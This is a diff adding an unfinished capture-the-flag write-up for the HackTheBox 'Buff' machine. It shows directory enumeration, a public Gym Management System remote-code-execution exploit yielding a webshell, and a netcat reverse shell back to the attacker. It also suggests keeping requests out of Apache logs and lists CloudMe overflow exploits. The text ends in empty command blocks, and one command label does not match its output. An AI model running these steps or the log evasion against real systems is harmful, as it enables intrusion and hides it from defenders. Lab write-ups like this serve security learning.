@@ -1,0 +1,226 @@
+Buff - Easy Windows Box
+
+Able to find vulnerable software, most likely windows machine. Vulneable software known as gym 
+management. Can do a file upload. First will run gobuster to check for any hidden directories:
+
+Can be found in the Contact page.
+COMMAND:
+================================================================================================
+gobuster dir -u  http://10.10.10.198:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.out
+================================================================================================
+OUTPUT:
+================================================================================================
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.198:8080/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/11/22 23:27:13 Starting gobuster
+===============================================================
+/.html (Status: 403)
+/.html.php (Status: 403)
+/index.php (Status: 200)
+/.htm (Status: 403)
+/.htm.php (Status: 403)
+/profile (Status: 301)
+/include (Status: 301)
+/register.php (Status: 200)
+/img (Status: 301)
+/contact.php (Status: 200)
+/LICENSE (Status: 200)
+/home.php (Status: 200)
+/upload (Status: 301)
+/upload.php (Status: 200)
+/about.php (Status: 200)
+/webalizer (Status: 403)
+/feedback.php (Status: 200)
+/edit.php (Status: 200)
+/. (Status: 200)
+/phpmyadmin (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/license (Status: 200)
+/Packages.php (Status: 200)
+/Register.php (Status: 200)
+/packages.php (Status: 200)
+/Home.php (Status: 200)
+/Contact.php (Status: 200)
+/up.php (Status: 200)
+/Include (Status: 301)
+/Upload (Status: 301)
+/Upload.php (Status: 200)
+/Profile (Status: 301)
+================================================================================================
+
+Now what we can do is run searchsploit and look for gym.
+COMMAND:
+================================================================================================
+searchsploit gym
+================================================================================================
+OUTPUT:
+================================================================================================
+------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                     |  Path
+------------------------------------------------------------------- ---------------------------------
+Gym Management System 1.0 - 'id' SQL Injection                     | php/webapps/48936.txt
+Gym Management System 1.0 - Authentication Bypass                  | php/webapps/48940.txt
+Gym Management System 1.0 - Stored Cross Site Scripting            | php/webapps/48941.txt
+Gym Management System 1.0 - Unauthenticated Remote Code Execution  | php/webapps/48506.py
+WordPress Plugin WPGYM - SQL Injection                             | php/webapps/42801.txt
+------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+================================================================================================
+We are able to see that there is an unauthenticated Remote Code execution, after downloading and 
+examining the file we are able to see that we can upload a file with doble extension and run code 
+on the remote machine.
+
+We will download and modify the exploit using the following:
+COMMAND:
+================================================================================================
+searchsploit -m php/webapps/48506.py
+================================================================================================
+OUTPUT:
+================================================================================================
+  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/48506
+     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /root/htb/buff/48506.py
+================================================================================================
+
+We can modify the exploit to use a proxy to examine how the commands and requests are being forwarded
+after doing that we can also modify the body of 'GET' to use 'REQUEST' within proxy manipulation
+to prevent it from showing up in apache access logs. Less bad characters in a post requests.
+
+COMMAND:
+================================================================================================
+python 48506.py http://10.10.10.198:8080/
+================================================================================================
+OUTPUT:
+================================================================================================
+            /\
+/vvvvvvvvvvvv \--------------------------------------,
+`^^^^^^^^^^^^ /============BOKU====================="
+            \/
+
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload> whoami
+�PNG
+�
+buff\shaun
+================================================================================================
+
+Given the limitations of the shell we get by running the exploit, we can go ahead and generate a 
+reverse shell of our own.
+COMMAND:
+================================================================================================
+nc -lnvp 5555
+cp /usr/share/windows-resources/binaries/nc.exe .
+cp /opt/tools/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe .
+================================================================================================
+OUTPUT:
+================================================================================================
+listening on [any] 5555 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.198] 49818
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\xampp\htdocs\gym\upload> whoami
+whoami
+buff\shaun
+PS C:\xampp\htdocs\gym\upload> cd c:\users
+================================================================================================
+
+We curled to get the the netcat executable over to the vulnerable windows machine and ran winPeas
+once we had a stable connection, however nothing of interest was found.
+
+If we keep searching inside shauns directory we will find in donwloads am executable called, 
+"CloudMe_1112.exe". We can try and ruun searchsploit and see if we can find anything of interest.
+
+we find that there is a local buffer overflow that can be caused by running the binary.
+COMMAND:
+================================================================================================
+CloudMe_1112.exe
+================================================================================================
+OUTPUT:
+================================================================================================
+------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                     |  Path
+------------------------------------------------------------------- ---------------------------------
+CloudMe 1.11.2 - Buffer Overflow (PoC)                             | windows/remote/48389.py
+CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                    | windows/local/48499.txt
+CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                    | windows/local/48840.py
+Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                   | windows_x86-64/remote/45197.rb
+CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)            | windows_x86-64/local/45159.py
+CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)     | windows/remote/44175.rb
+CloudMe Sync 1.11.0 - Local Buffer Overflow                        | windows/local/44470.py
+CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                    | windows/remote/46218.py
+CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)           | windows_x86-64/remote/46250.py
+CloudMe Sync < 1.11.0 - Buffer Overflow                            | windows/remote/44027.py
+CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)         | windows_x86-64/remote/44784.py
+------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
